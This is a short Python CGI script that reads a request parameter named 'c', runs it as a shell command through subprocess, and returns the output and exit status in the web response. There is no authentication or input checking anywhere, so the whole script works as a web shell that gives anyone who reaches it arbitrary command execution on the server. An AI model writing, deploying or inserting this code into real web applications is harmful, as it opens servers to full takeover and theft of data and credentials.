#!/usr/bin/python3

print("content-type: text/html")
print()

import cgi
import subprocess as sp

form = cgi.FieldStorage()

command = form.getvalue("c")

cmd = "{}".format(command)
print(cmd)
output = sp.getstatusoutput(cmd)
status = output[0]
out = output[1]

print(out)
print(status)
